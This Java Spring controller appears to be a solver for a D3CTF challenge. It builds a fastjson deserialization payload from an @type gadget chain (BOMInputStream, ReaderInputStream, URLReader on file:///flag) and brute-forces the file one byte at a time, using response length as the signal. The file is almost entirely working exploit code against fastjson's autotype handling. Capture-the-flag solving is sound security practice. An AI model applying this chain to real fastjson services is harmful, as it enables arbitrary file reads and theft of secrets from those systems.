package com.d3ctf.exp.controller;


import com.d3ctf.exp.request.ExpRequest;
import com.dtflys.forest.http.ForestResponse;
import org.springframework.stereotype.Controller;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.ResponseBody;

import javax.annotation.Resource;
import java.io.IOException;
import java.nio.file.Files;
import java.nio.file.Paths;

@Controller
public class EvilController {

    @Resource
    private ExpRequest expRequest;


    String flag = "";

    @RequestMapping("/hack")
    @ResponseBody
    public String hack(int i) { // flag byte error
        byte[] bytes;
        String payload = null;
            payload = "[{\n" +
                    "  \"1ue\": {\n" +
                    "    \"@type\": \"java.lang.Exception\",\n" +
                    "    \"@type\": \"com.d3ctf.exceptions.ForestRespException\"\n" +
                    "  }\n" +
                    "},\n" +
                    "  {\n" +
                    "    \"2ue\": {\n" +
                    "      \"@type\": \"java.lang.Class\",\n" +
                    "      \"val\": {\n" +
                    "        \"@type\": \"com.alibaba.fastjson.JSONObject\",\n" +
                    "  {\n" +
                    "    \"@type\": \"java.lang.String\"\n" +
                    "    \"@type\": \"com.d3ctf.exceptions.ForestRespException\",\n" +
                    "    \"response\": \"\"\n" +
                    "  }\n" +
                    "}\n" +
                    "},\n" +
                    "  {\n" +
                    "    \"3ue\": {\n" +
                    "      \"@type\": \"com.dtflys.forest.http.ForestResponse\",\n" +
                    "      \"@type\": \"com.dtflys.forest.backend.httpclient.response.HttpclientForestResponse\",\n" +
                    "      \"entity\": {\n" +
                    "        \"@type\": \"org.apache.http.entity.AbstractHttpEntity\",\n" +
                    "        \"@type\": \"org.apache.http.entity.InputStreamEntity\",\n" +
                    "        \"inStream\": {\n" +
                    "          \"@type\": \"org.apache.commons.io.input.BOMInputStream\",\n" +
                    "          \"delegate\": {\n" +
                    "            \"@type\": \"org.apache.commons.io.input.ReaderInputStream\",\n" +
                    "            \"reader\": {\n" +
                    "              \"@type\": \"jdk.nashorn.api.scripting.URLReader\",\n" +
                    "              \"url\": \"file:///flag\"\n" +
                    "            },\n" +
                    "            \"charsetName\": \"UTF-8\",\n" +
                    "            \"bufferSize\": 1024\n" +
                    "          },\n" +
                    "          \"boms\": [\n" +
                    "            {\n" +
                    "              \"@type\": \"org.apache.commons.io.ByteOrderMark\",\n" +
                    "              \"charsetName\": \"UTF-8\",\n" +
                    "              \"bytes\": [\n" +
                    "                ${exp}\n" +
                    "              ]\n" +
                    "            }\n" +
                    "          ]\n" +
                    "        }\n" +
                    "      }\n" +
                    "    }\n" +
                    "  },\n" +
                    "  {\n" +
                    "    \"4ue\": {\n" +
                    "      \"$ref\": \"$[2].3ue.entity.inStream\"\n" +
                    "    }\n" +
                    "  },\n" +
                    "  {\n" +
                    "    \"5ue\": {\n" +
                    "      \"$ref\": \"$[3].4ue.bOM.bytes\"\n" +
                    "    }\n" +
                    "  },\n" +
                    "  {\n" +
                    "    \"6ue\": {\n" +
                    "      \"@type\": \"com.dtflys.forest.backend.httpclient.response.HttpclientForestResponse\",\n" +
                    "      \"entity\": {\n" +
                    "        \"@type\": \"org.apache.http.entity.InputStreamEntity\",\n" +
                    "        \"inStream\": {\n" +
                    "          \"@type\": \"org.apache.commons.io.input.BOMInputStream\",\n" +
                    "          \"delegate\": {\n" +
                    "            \"@type\": \"org.apache.commons.io.input.ReaderInputStream\",\n" +
                    "            \"reader\": {\n" +
                    "              \"@type\": \"org.apache.commons.io.input.CharSequenceReader\",\n" +
                    "              \"charSequence\": {\n" +
                    "                \"@type\": \"java.lang.String\"\n" +
                    "  {\n" +
                    "    \"$ref\": \"$[4].5ue\"\n" +
                    "  },\n" +
                    "  \"start\"\n" +
                    "  :\n" +
                    "  0,\n" +
                    "  \"end\"\n" +
                    "  :\n" +
                    "  0\n" +
                    "  },\n" +
                    "  \"charsetName\"\n" +
                    "  :\n" +
                    "  \"UTF-8\",\n" +
                    "  \"bufferSize\"\n" +
                    "  :\n" +
                    "  1024\n" +
                    "  },\n" +
                    "  \"boms\"\n" +
                    "  :\n" +
                    "  [\n" +
                    "    {\n" +
                    "      \"@type\": \"org.apache.commons.io.ByteOrderMark\",\n" +
                    "      \"charsetName\": \"UTF-8\",\n" +
                    "      \"bytes\": [\n" +
                    "        1\n" +
                    "      ]\n" +
                    "    }\n" +
                    "  ]\n" +
                    "  }\n" +
                    "}\n" +
                    "\n" +
                    "}\n" +
                    "}" +
                    "]\n";
            if (flag.indexOf(",")!=-1) {
                payload = payload.replace("${exp}", flag + "," + i);
            } else {
                payload = payload.replace("${exp}", i+"");
            }
            System.out.println(flag + "," + i);
//            System.out.println(payload);
//        } catch (IOException e) {
//            e.printStackTrace();
//        }
        return payload;
    }

    @RequestMapping("exp")
    @ResponseBody
    public Object exp() throws Exception {
        for (int j = 0; j <= 30; j++) {
            for (int i = 1; i <= 256; i++) {
                ForestResponse response = expRequest.hack(i);
                Object result = response.getResult();
                int length = response.getByteArray().length;
                System.out.println(length);
                if (length <= 1000) {
                    flag = flag + "," + i;
                    System.out.println("flag:" + flag);
                }
            }
        }
        return flag;
    }
}


